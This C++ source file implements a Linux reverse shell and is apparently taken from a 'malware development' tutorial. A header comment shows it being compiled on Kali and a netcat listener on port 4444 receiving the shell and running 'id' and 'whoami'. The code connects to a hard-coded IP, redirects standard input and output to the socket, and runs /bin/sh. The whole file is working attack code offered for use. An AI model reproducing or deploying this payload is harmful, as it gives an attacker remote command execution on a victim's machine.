/* https://sid4hack.medium.com/malware-development-part-3-669bebef79c4
                                                                                                                                                            
┌──(kali㉿kali)-[~/data/malware]
└─$ g++ -o revsh_elf_00 revsh_elf_00.cpp -static-libgcc -static-libstdc++
                                                                                                                                                            
┌──(kali㉿kali)-[~/data/malware]
└─$ ./revsh_elf_00 

┌─[user@parrot]─[~]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.159.128 37712
id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),107(bluetooth),115(scanner),126(lpadmin),134(wireshark),136(kaboxer)
whoami
kali
*/

#include <iostream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    const char* ip = "192.168.159.130";
    int port = 4444;

    // Address structure
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    // Socket creation
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Connect to attacker's machine
    if (connect(sockfd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    // Redirect standard input, output, and error to the socket
    for (int i = 0; i < 3; i++) {
        if (dup2(sockfd, i) < 0) {
            perror("dup2 failed");
            exit(EXIT_FAILURE);
        }
    }

    // Execute shell
    char *const argv[] = {const_cast<char*>("/bin/sh"), nullptr};
    if (execve("/bin/sh", argv, nullptr) < 0) {
        perror("execve failed");
        exit(EXIT_FAILURE);
    }

    return 0;
}
